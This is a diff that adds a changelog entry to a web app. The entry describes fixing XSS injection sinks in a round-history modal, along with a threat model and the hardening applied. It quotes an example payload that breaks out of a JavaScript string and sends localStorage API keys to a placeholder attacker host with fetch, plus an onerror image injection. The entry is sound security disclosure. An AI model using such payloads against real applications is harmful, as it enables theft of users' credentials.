@@ -2,6 +2,43 @@
 
 ---
 
+## v3.63.338
+
+**XSS hardening in `viewRoundDoc()` round-history modal (Codex security review) · superseded backlog snapshots removed**
+
+Build: `20260613-032`<br>
+Released: `2026-06-13`
+
+### What changed
+
+**Security: XSS in `viewRoundDoc()` round-history modal — HIGH severity.** External code review (Codex) flagged three injection sinks in the round-history "View Round Document" modal that fires from the Work screen's history list:
+
+- Reviewer AI ids landed unescaped inside an `onclick="switchHistTab('${id}',…)"` JS string literal — a crafted id like `x', fetch('https://attacker/'+localStorage.getItem('waxframe_keys'));('y` breaks out of the JS string and runs arbitrary code with full `localStorage` access.
+- Same ids landed inside the element `id="histresp-${id}"` attribute, then `switchHistTab` called `modal.querySelector(\`#histresp-${id}\`)` — selector injection with the same blast radius.
+- `h.phase` and `h.timestamp` from the history blob landed unescaped inside `innerHTML` — a crafted timestamp could inject `<img src=x onerror=…>` directly.
+
+**Threat model:** the `history` array is restored verbatim from checkpoint JSON during Restore Checkpoint. A malicious actor could craft a checkpoint, trick the user into restoring it (the existing flow accepts user-supplied .json files), then any "View document" click on a tampered round would execute attacker JS with localStorage access — and `localStorage` is exactly where every provider's API key lives. Stealing keys is a one-line fetch.
+
+**Fix.** Replaced the inline `onclick` + computed-id-selector pattern with `data-tab-id` / `data-panel-id` attributes plus a single delegated click listener on the modal element. The escape-everywhere fix on the innerHTML is unconditional now — every dynamic value passes through `esc()`, including `h.round`, `h.phase` fallback, and `h.timestamp`. `switchHistTab` looks up the active panel via `[data-panel-id="${CSS.escape(id)}"]` instead of building an id selector from user input. The delegated listener attaches to the modal element so when the modal is removed from the DOM the listener is GC'd with it (no leak).
+
+Confirmed no other call sites of `switchHistTab` or the `histresp-` id pattern remain in the codebase — the only remaining references are the new code and explanatory comments documenting the fix.
+
+**Repo hygiene: superseded backlog snapshots removed.** Same Codex review flagged that `docs/WaxFrame_Backlog_Master_v249.txt` and `v250.txt` were still tracked alongside the current `v251.txt`. v251 is the canonical backlog; the older two were noise. Removed both from git. This also aligns with the "3-version backlog margin enforced; no release-notes-vX.Y.Z.md files in the repo at all" feedback rule — backlog snapshots were drifting past that margin.
+
+### What's deferred from the same review
+
+- **CSP (Medium):** the app relies heavily on inline scripts + handlers; moving to nonce/hash-based CSP would materially reduce XSS blast radius but is a multi-release refactor. Logging as a future item.
+- **CI behavior tests (Medium):** release-check validates ceremony, not user flows. The screenshot smoke tool exists but isn't CI-gated. Logging as a future item.
+- **SheetJS Dependabot gap (Low):** the vendored xlsx parser is outside Dependabot. Logging as a future item.
+
+### Files touched
+
+- [js/app.js](js/app.js) — `viewRoundDoc` rewritten to escape all dynamic header values, use data-attributes + delegated listener instead of inline onclick + computed ids; `switchHistTab` rewritten to look up by data-panel-id with CSS.escape
+- `docs/WaxFrame_Backlog_Master_v249.txt`, `docs/WaxFrame_Backlog_Master_v250.txt` — deleted (superseded by v251)
+- [CHANGELOG.md](CHANGELOG.md), [js/version.js](js/version.js), [package.json](package.json), cache-bust stamps across all helper HTMLs
+
+---
+
 ## v3.63.337
 
 **Add Custom AI flow: dedup duplicate `GET /v1/models` and retire the modal's wasted auto-recommend POST**
